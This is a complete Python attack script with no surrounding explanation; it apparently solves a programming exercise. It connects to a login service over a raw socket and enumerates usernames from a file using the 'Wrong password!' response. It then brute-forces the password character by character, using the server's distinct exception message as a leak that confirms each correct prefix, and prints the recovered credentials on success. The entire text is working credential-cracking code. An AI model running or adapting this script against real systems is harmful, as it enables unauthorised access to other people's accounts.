import sys, socket, json, itertools
host, port = sys.argv[1:]

letters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
with socket.socket() as client_socket:
    client_socket.connect((host, int(port)))
    dict = {}
    with open('logins.txt', 'r') as login_file:

        for line in login_file:
            line = line.strip("\n")
            dict["login"] = line
            dict["password"] = ' '
            ms = json.dumps(dict, indent=4)
            client_socket.send(ms.encode())
            if json.loads(client_socket.recv(1024).decode())["result"] == "Wrong password!":
                break
        dict["password"] = ''

    while True:
        for i in letters:
            ms = json.dumps({"login":dict["login"], "password": dict["password"] + i}, indent=4)
            client_socket.send(ms.encode())
            res = json.loads(client_socket.recv(1024).decode())
            if res["result"] == "Exception happened during login":
                dict["password"] += i
            elif res["result"] == "Connection success!":
                dict["password"] += i
                print(json.dumps(dict))
                exit()
